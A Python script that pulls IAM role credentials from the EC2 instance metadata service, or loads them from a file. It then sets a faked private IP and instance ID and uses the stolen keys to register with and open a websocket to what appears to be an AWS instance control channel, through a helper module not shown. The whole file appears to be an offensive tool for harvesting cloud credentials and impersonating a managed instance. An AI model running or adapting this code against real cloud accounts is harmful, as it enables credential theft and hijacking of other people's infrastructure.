#!/usr/bin/env python3

import requests, json
import aws_request

def retrieve_meta() -> json:
    resp = requests.get("http://169.254.169.254/latest/dynamic/instance-identity/document")
    return json.loads(resp.text)

def retrieve_role_name() -> str:
    resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    return resp.text

def retrieve_role_creds(role_name) -> json:
    headers = { "X-Aws-Ec2-Metadata-Token-Ttl-Seconds": "21600" }
    resp = requests.put("http://169.254.169.254/latest/api/token", headers=headers)
    api_token = resp.text

    headers = { "X-Aws-Ec2-Metadata-Token": api_token }
    resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role_name, headers=headers)
    return json.loads(resp.text)

def retrieve_role_creds_from_file(file_name):
    with open(file_name, 'r') as r:
        return json.loads("".join(r.readlines()))

def parse_control_channel(data):
    lines = data.split("\n")
    access_token = lines[2][lines[2].find(">")+1:lines[2].find("</")]
    url = lines[3][lines[3].find(">")+1:lines[3].find("</")] 
    return access_token, url

# Get role name and credentials
#role_name = retrieve_role_name()
#role_creds = retrieve_role_creds(role_name)
role_creds = retrieve_role_creds_from_file("creds.json")
#meta = retrieve_meta()
meta = {"a":"A"}
meta["privateIp"] = "10.10.10.10"
meta["instanceId"] = "i-03fd28c6aec546b58"

aws_request.post_base(meta['privateIp'], meta['instanceId'], role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])
resp = aws_request.post_control_channel(meta['instanceId'], role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])

access_token, url = parse_control_channel(resp)

# Connect to Websocket
path = url[url.find("/v1"):]
aws_request.initiate_websocket_connection(url, path, access_token, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])

